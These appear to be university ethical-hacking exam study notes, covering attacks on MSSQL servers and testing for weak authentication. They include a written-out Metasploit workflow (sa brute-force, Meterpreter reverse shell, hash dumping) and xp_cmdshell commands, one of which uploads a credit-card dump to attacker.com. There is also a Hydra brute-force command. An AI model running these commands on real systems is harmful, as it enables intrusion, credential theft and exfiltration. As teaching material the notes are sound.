- **`WAITFOR DELAY`:** Causes the SQL Server to pause execution for a specified duration. Attackers use it to perform **time-based blind SQLi** — if the response takes 5 seconds, the condition is TRUE; if it returns immediately, the condition is FALSE. This is unique to MSSQL (MySQL uses `SLEEP()`).
- **`CONVERT` / `CAST`:** These type-conversion functions are leveraged in **error-based SQLi**. Forcing a conversion of a subquery result to `int` triggers a conversion error message that contains the leaked data in the error text.
- **`@@version`:** A built-in global variable that returns the SQL Server version. Attackers use it as a fingerprinting payload in injection attacks.

---

### **Question B (14 Marks)** `[KTU University Exam - Model Paper 2024]`

**(a)** Explain the **Metasploit Framework exploitation modules** specific to MSSQL. Describe the workflow from `mssql_login` to `mssql_payload` deployment with the exact configuration steps. **(7 Marks)**

**(b)** Discuss **post-exploitation activities** after gaining MSSQL sysadmin access — including `xp_cmdshell` abuse, hash dumping, data exfiltration, and lateral movement. **(7 Marks)**

#### **Model Answer — Part (a) (7 Marks)**

**Key Metasploit Modules (3 Marks):**

| Module | Path | Purpose |
|---|---|---|
| `mssql_ping` | `auxiliary/scanner/mssql/mssql_ping` | Discovers MSSQL instances via SSRP |
| `mssql_login` | `auxiliary/scanner/mssql/mssql_login` | Performs credential brute-force |
| `mssql_enum` | `auxiliary/admin/mssql/mssql_enum` | Enumerates DBs, logins, config |
| `mssql_exec` | `auxiliary/admin/mssql/mssql_exec` | Runs SQL queries as authenticated user |
| `mssql_payload` | `exploit/windows/mssql/mssql_payload` | Uploads & executes Meterpreter payload |
| `mssql_hashdump` | `post/windows/manage/mssql_hashdump` | Extracts SQL login password hashes |

**Exploitation Workflow (4 Marks):**

**Step 1: Discovery**
```bash
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS 192.168.1.0/24
run
```

**Step 2: Authentication**
```bash
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 192.168.1.50
set USERNAME sa
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```
*Output confirms valid credentials: `[+] 192.168.1.50:1433 - Login Successful: sa:password123`*

**Step 3: Privilege Verification**
```bash
use auxiliary/admin/mssql/mssql_exec
set RHOSTS 192.168.1.50
set USERNAME sa
set PASSWORD password123
set CMD "SELECT IS_SRVROLEMEMBER('sysadmin')"
run
```
*If output is `1`, the user is a sysadmin.*

**Step 4: Payload Deployment**
```bash
use exploit/windows/mssql/mssql_payload
set RHOSTS 192.168.1.50
set USERNAME sa
set PASSWORD password123
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit
```
*Result: Meterpreter session opened, granting interactive Windows shell.*

#### **Model Answer — Part (b) (7 Marks)**

**Post-Exploitation Activities:**

**1. `xp_cmdshell` Abuse (2 Marks):**
After confirming sysadmin access, the attacker re-enables and abuses `xp_cmdshell`:
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
```

**2. Hash Dumping (2 Marks):**
```bash
use post/windows/manage/mssql_hashdump
set SESSION <session_id>
run
```
*Returns all SQL login hashes, which can be cracked with `hashcat -m 1731` (mode 1731 = MSSQL 2012/2014) or `john --format=mssql12`.*

**3. Data Exfiltration (2 Marks):**
```sql
EXEC xp_cmdshell 'bcp "SELECT * FROM SensitiveDB.dbo.CreditCards" queryout C:\Windows\Temp\dump.txt -T -c';
EXEC xp_cmdshell 'powershell -Command "(New-Object Net.WebClient).UploadFile(''http://attacker.com/collect.php'', ''C:\Windows\Temp\dump.txt'')"';
```

**4. Lateral Movement (1 Mark):**
- Use `xp_cmdshell` to run `net view /domain` for domain enumeration.
- Pass-the-hash attacks using extracted hashes.
- Use **PowerView** or **BloodHound** to map Active Directory paths.
- Deploy additional Meterpreter sessions on adjacent hosts via `psexec`, `wmi`, or `winrm`.

---

## 5.3 KTU Examiner's Valuation Warning / Pitfall Callout

> [!WARNING]
> **Common Marks-Loss Pitfalls in KTU 2024 Exams:**
> 1. **Confusing Port 1433 with 1434** — Examiners allocate 1 mark specifically for identifying which is TCP and which is UDP. Mixing them up loses a mark.
> 2. **Writing `xp_cmdshell` as a "command" rather than a "stored procedure"** — Definition precision matters. It is an *extended stored procedure*, not a regular SQL command.
> 3. **Forgetting to mention `sa` (System Administrator) explicitly** — The default MSSQL admin account is almost always asked in Part A; vague answers like "admin account" lose marks.
> 4. **Not showing the two-line `sp_configure` activation sequence** — Many students enable `xp_cmdshell` with a single statement, which is incorrect in modern versions. The four-statement sequence (show advanced options → reconfigure → enable xp_cmdshell → reconfigure) is required.
> 5. **Omitting tool names** — Examiners expect at least two named tools per attack stage (e.g., Nmap + Metasploit for discovery, Hydra + John the Ripper for password cracking).
> 6. **Skipping the password complexity calculation** — When asked about authentication attacks, including the brute-force time formula (Section 3.2) demonstrates analytical depth and earns extra credit.

---

## 5.4 Topic Recap & Important Things to Remember

> [!IMPORTANT]
> **Rapid Revision Checklist — Attacking SQL Servers**

- **Default Port:** TCP **1433** (service), UDP **1434** (Browser/SSRP)
- **Default Admin Account:** `sa` (System Administrator)
- **Authentication Modes:** Windows-only and Mixed Mode
- **Discovery Tools:** Nmap (`-sV`, `ms-sql-info` script), SQLPing, SQLPing3
- **Enumeration Tool:** Metasploit `mssql_ping` (SSRP), `mssql_enum`
- **Authentication Attack Tools:** Hydra, Medusa, Metasploit `mssql_login`
- **Key Exploitation Module:** `exploit/windows/mssql/mssql_payload`
- **MSSQL-Specific OS Execution:** `xp_cmdshell` (requires sysadmin + activation)
- **Hash Dumping:** `post/windows/manage/mssql_hashdump` (mode 1731 in hashcat)
- **SQL Injection Categories:** Tautology, Union, Error-based, Blind Boolean, Blind Time-based, Stacked
- **MSSQL-Specific SQLi Functions:** `WAITFOR DELAY` (timing), `CONVERT`/`CAST` (error-based), `@@version` (fingerprinting)
- **Common System Databases:** `master`, `model`, `msdb`, `tempdb`
- **Hardening Recommendations:** Disable `sa`, enforce strong passwords, disable `xp_cmdshell`, enable TDE (Transparent Data Encryption), use Windows-only auth, restrict network access via firewall
- **Brute-Force Time Estimate:** For 8-char mixed-case alphanumeric passwords, expect ~96+ years at $10^9$ attempts/sec — emphasizing the importance of dictionary attacks
- **Post-Exploitation Pivot:** Compromised MSSQL → Windows host → Active Directory → Domain Admin
- **Metasploit Workflow:** `mssql_ping` → `mssql_login` → `mssql_exec` → `mssql_payload` → `mssql_hashdump`

---

**END OF NOTES — Module 2, Topic: Attacking SQL Servers**

topics.title: Testing for Weak Authentication
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PBCCT604 - ETHICAL HACKING & IOT SECURITY
> - **Module:** Module 2
> - **Topic:** Testing for Weak Authentication

<!-- SECTION_1_START -->
# SECTION 1: Core Technical Definition & Intuitive Overview

## 1.1 Formal Academic Definition

> [!IMPORTANT] > **KTU 2024 Syllabus Definition**
> **Authentication** is the process of verifying the identity of a user, device, or system entity, typically through credentials such as passwords, tokens, biometrics, or cryptographic keys. **Weak Authentication** refers to any authentication mechanism that can be bypassed, brute-forced, guessed, replayed, or otherwise compromised due to flawed design, weak credentials, insecure transmission, or improper implementation.

In the context of **Ethical Hacking** (as per KTU Module 2), *Testing for Weak Authentication* is the systematic methodology used by penetration testers to identify, validate, and exploit vulnerabilities in an application's or system's authentication layer. It is classified under the **OWASP Testing Guide (v4.2)** as one of the most critical categories of web application security testing.

> [!NOTE] > **Syllabus Highlight (KTU 2024 Scheme)**
> Testing for weak authentication falls under the broader domain of **Web Application Penetration Testing (WAPT)** and is directly mapped to **Course Outcome CO2**: *"Identify and exploit security vulnerabilities in web and network-based systems using standard ethical hacking tools."*

## 1.2 Intuitive Real-World Analogy

Imagine a **high-security bank vault** that is supposed to require a 6-digit PIN and a fingerprint scan. However, the bank manager decides to:

- Accept only a **4-digit PIN** (shorter key = fewer combinations to try)
- Allow **unlimited PIN attempts** without lockout
- Store the PIN in **plaintext on a sticky note** near the vault
- Allow the **default PIN "1234"** to never be changed
- Skip fingerprint verification **during maintenance hours**

This is precisely what *weak authentication* looks like in the digital world. An attacker (ethical hacker) acts as a **professional locksmith** hired by the bank to test whether the vault can be cracked. The locksmith uses tools like **lock-picking sets** (brute-force tools), **social engineering** (phishing for the PIN), and **inspection of the vault design** (code review) to find weaknesses.

## 1.3 Core Authentication Factors

Authentication relies on one or more of the following factors:

| Factor Type | Description | Example |
|---|---|---|
| **Knowledge Factor (Something you know)** | Secret information known to the user | Password, PIN, Security Question |
| **Possession Factor (Something you have)** | Physical or digital token | Smart card, OTP, Mobile device |
| **Biometric Factor (Something you are)** | Unique biological trait | Fingerprint, Retina, Face ID |
| **Location Factor (Somewhere you are)** | Geographic or network context | IP address, Geolocation |
| **Behavior Factor (Something you do)** | User behavioral pattern | Typing rhythm, Gait analysis |

> [!WARNING] > **Single-Factor Weakness**: When authentication depends on a *single* weak factor (e.g., only a password), it is referred to as **Single-Factor Authentication (SFA)** — the most common target for attackers in KTU practical scenarios.

## 1.4 Threat Surface in Weak Authentication

The authentication threat surface in IoT and web systems comprises:

- **Login Forms** (HTML/HTTP POST)
- **API Authentication Endpoints** (REST/SOAP)
- **Session Management Tokens** (Cookies, JWT)
- **Multi-Factor Authentication (MFA) Bypass Points**
- **Password Recovery / Reset Workflows**
- **Remember-Me Functionality**
- **Default / Hardcoded Credentials in IoT Devices**

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# SECTION 2: Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 Operational Concept Breakdown

Testing for weak authentication follows a **structured penetration testing methodology**. Below is the step-by-step operational logic:

### Step 1: Reconnaissance (Information Gathering)
- **Why**: Identify all authentication endpoints, default credentials, and exposed services.
- **How**: Use tools like **Nmap**, **Nessus**, **Shodan**, and **OWASP ZAP** to map login pages, API endpoints, and IoT device interfaces.
- **Engineering Utility**: Forms the baseline threat model before exploitation.

### Step 2: Authentication Mechanism Analysis
- **Why**: Determine *how* the system authenticates users and *what* factors are in use.
- **How**:
  - Inspect HTTP headers (`Authorization`, `WWW-Authenticate`)
  - Check for transport security (HTTPS vs. HTTP)
  - Analyze JavaScript for client-side validation
  - Review source code (if accessible) for hardcoded credentials

### Step 3: Credential Testing (Weak Password Discovery)
- **Why**: Most breaches occur due to predictable or reused passwords.
- **How**: Use **dictionary attacks** (using common password lists like `rockyou.txt`) and **brute-force attacks** (trying all combinations).

> [!IMPORTANT] > **KTU High-Yield Concept**: The strength of a password is mathematically modeled using **information entropy**.

## 2.2 KTU High-Yield Formula Sheet

| Formula / Concept | Expression | Description | Unit / Notes |
|---|---|---|---|
| **Password Entropy** | $E = L \times \log_2(R)$ | Measures password strength in bits | $E$ in bits, $L$ = length, $R$ = pool size |
| **Total Search Space** | $N = R^L$ | Total possible password combinations | Dimensionless (count) |
| **Average Brute-Force Time** | $T_{avg} = \dfrac{N}{2 \times R_{rate}}$ | Time to crack in average case | Seconds |
| **Lockout Threshold** | $L_{th} = k$ (constant) | Max failed attempts before lockout | Integer (e.g., 3, 5) |
| **Key Derivation (bcrypt cost)** | $T_{hash} = 2^{c}$ rounds | Computational cost per hash | $c$ = cost factor (10–14 typical) |
| **MFA Strength Score** | $S_{mfa} = \sum_{i=1}^{n} w_i \cdot f_i$ | Weighted sum of authentication factors | Dimensionless index |
| **Session Token Entropy** | $H = \log_2(2^{b}) = b$ bits | Bits of randomness in session ID | Bits |
| **Cracking Rate (GPU)** | $R_{rate} \approx 10^{9}$ to $10^{11}$ | Modern GPU hash attempts per second | Hashes/sec |

> [!NOTE] > **Pool Size ($R$) Reference**: Lowercase letters (26), Uppercase (26), Digits (10), Special (32). Maximum $R = 94$ for printable ASCII.

### 2.3 Real-World Engineering Utility

Weak authentication testing is critical in:

- **Banking & FinTech**: Prevents unauthorized fund transfers
- **Healthcare IoT**: Protects patient data on connected medical devices
- **Industrial Control Systems (ICS)**: Prevents sabotage of SCADA systems
- **Smart Home IoT**: Secures devices often shipped with default credentials (e.g., `admin:admin`)
- **Cloud APIs**: Validates OAuth 2.0, JWT, and API key implementations

## 2.4 Common Weak Authentication Vulnerabilities (CWE Mapped)

| CWE ID | Vulnerability | Description |
|---|---|---|
| **CWE-521** | Weak Password Requirements | No complexity / length policy |
| **CWE-262** | Not Using Password Management | Plaintext storage of credentials |
| **CWE-287** | Improper Authentication | Logic flaws in auth flow |
| **CWE-294** | Authentication Bypass by Capture-Replay | Token reuse attacks |
| **CWE-798** | Use of Hard-coded Credentials | Default or embedded passwords |
| **CWE-307** | Improper Restriction of Excessive Auth Attempts | No brute-force protection |
| **CWE-640** | Weak Password Recovery Mechanism | Predictable reset tokens |
| **CWE-916** | Use of Password Hash with Insufficient Computational Effort | Fast hash (MD5, SHA1) |

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
# SECTION 3: Step-by-Step Derivations & Analytical Matrix

## 3.1 Derivation: Password Entropy & Brute-Force Time

### Derivation 1: Password Entropy Formula

The **entropy** of a password is the measure of its unpredictability, expressed in bits.

**Step 1: Define the pool size $R$**

$$R = R_{lower} + R_{upper} + R_{digit} + R_{special}$$

For standard ASCII printable passwords:

$$R = 26 + 26 + 10 + 32 = 94$$

**Step 2: Define the total search space $N$**

The total number of possible passwords of length $L$ drawn from a pool of $R$ characters is:

$$N = R^L$$

**Step 3: Apply the base-2 logarithm to obtain entropy**

Since each character contributes $\log_2(R)$ bits of information, and there are $L$ characters:

$$E = L \times \log_2(R)$$

**Conversion Logic**: Entropy represents the number of bits an attacker would need to guess. Each bit doubles the search space. A 128-bit entropy password is computationally infeasible to brute-force.

---

### Derivation 2: Average Brute-Force Crack Time

**Step 1: Assume uniform password distribution**

In the worst case, the password is the last one tried. In the **average case**, an attacker tries half of the total space:

$$N_{avg} = \frac{R^L}{2}$$

**Step 2: Divide by the cracking rate**

If the attacker can test $R_{rate}$ passwords per second, the average time to crack is:

$$T_{avg} = \frac{R^L}{2 \times R_{rate}}$$

**Step 3: Convert to practical units**

$$T_{avg\_hours} = \frac{T_{avg}}{3600}, \quad T_{avg\_days} = \frac{T_{avg}}{86400}$$

**Numerical Example for KTU Exam**:

Consider an 8-character password ($L = 8$) using only lowercase letters ($R = 26$), with a GPU cracking rate of $R_{rate} = 10^{10}$ hashes/sec.

$$N = 26^8 = 208{,}827{,}064{,}576$$

$$T_{avg} = \frac{208{,}827{,}064{,}576}{2 \times 10^{10}} = 10.44 \text{ seconds}$$

> [!WARNING] > **Implication**: An 8-character lowercase-only password can be cracked in **~10 seconds** on a modern GPU. This is why KTU 2024 syllabus emphasizes **multi-factor** and **long passphrases**.

---

### Derivation 3: MFA Bypass Probability

When Multi-Factor Authentication (MFA) is partially implemented, an attacker may bypass one factor but not the other. Assuming independent factors with bypass probabilities $p_1$ and $p_2$:

$$P_{bypass} = p_1 \times p_2$$

For two independent factors each with 10% bypass probability:

$$P_{bypass} = 0.1 \times 0.1 = 0.01 = 1\%$$

This shows the **multiplicative security gain** of MFA — even weak factors combined dramatically reduce attack success.

## 3.2 Analytical Matrix: Attack vs. Defense

| Attack Vector | Description | Tool Used | Defense Mechanism |
|---|---|---|---|
| **Brute Force** | Try all combinations | Hydra, Medusa | Account lockout, CAPTCHA, rate limiting |
| **Dictionary Attack** | Use common password lists | John the Ripper | Password policy enforcement |
| **Credential Stuffing** | Reuse leaked credentials | Sentry MBA, OpenBullet | MFA, breach detection |
| **Session Hijacking** | Steal session tokens | Burp Suite, Wireshark | Secure cookies, HTTPS, token rotation |
| **Password Spraying** | One password, many accounts | CrackMapExec | Anomaly detection |
| **Authentication Bypass** | Logic flaw exploitation | Manual testing | Proper session validation |
| **Phishing** | Social engineering | SET (Social Engineering Toolkit) | User awareness, FIDO2/WebAuthn |
| **Default Credentials** | Factory-set passwords | RouterSploit, IoTSeeker | Forced password change on first login |

## 3.3 Detailed Attack Walkthrough: Hydra (Brute-Force)

**Step 1: Identify the login endpoint**

Use browser inspection or Nmap to locate the login form's POST URL and parameters (e.g., `/login.php` with `username` and `password` fields).

**Step 2: Prepare a username and password list**

Download a wordlist (e.g., `rockyou.txt` containing ~14 million common passwords).

**Step 3: Execute the brute-force tool**

For HTTP POST-based login, a typical command structure is:

`hydra -L users.txt -P rockyou.txt target.com http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"`

**Step 4: Interpret the output**

Hydra reports the valid credentials when the failure string ("Invalid login") is absent from the server response.

**Step 5: Document and remediate**

The penetration tester logs findings, severity (typically **High/Critical**), and recommends **account lockout**, **rate limiting**, and **MFA**.

> [!IMPORTANT] > **KTU Practical Note**: Always obtain **written authorization** before performing brute-force attacks. Unauthorized brute-forcing is illegal under the **IT Act 2000 (India)**, Section 66.

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# SECTION 4: Structural Diagrams & Schematics

## 4.1 Block-Level Functional Architecture: Weak Authentication Testing Flow

```mermaid
flowchart TD
    A[Start: Reconnaissance] --> B[Identify Authentication Endpoints]
    B --> C{Mechanism Analysis}
    C -->|HTTP Basic| D[Inspect Authorization Header]
    C -->|Form-Based| E[Map Login Fields and Actions]
    C -->|Token-Based| F[Analyze JWT/Cookie Structure]
    C -->|IoT Device| G[Scan for Default Credentials]
    D --> H[Credential Testing]
    E --> H
    F --> H
    G --> H
    H --> I{Dictionary Attack}
    I -->|Success| J[FOUND: Weak Credentials]
    I -->|Fail| K{Brute Force}
    K -->|Success| J
    K -->|Fail| L{Logic Flaw Test}
    L -->|Bypass Found| M[FOUND: Auth Bypass]
    L -->|Secure| N[Document: No Weakness]
    J --> O[Generate Report]
    M --> O
    N --> O
    O --> P[End: Recommendations]
```

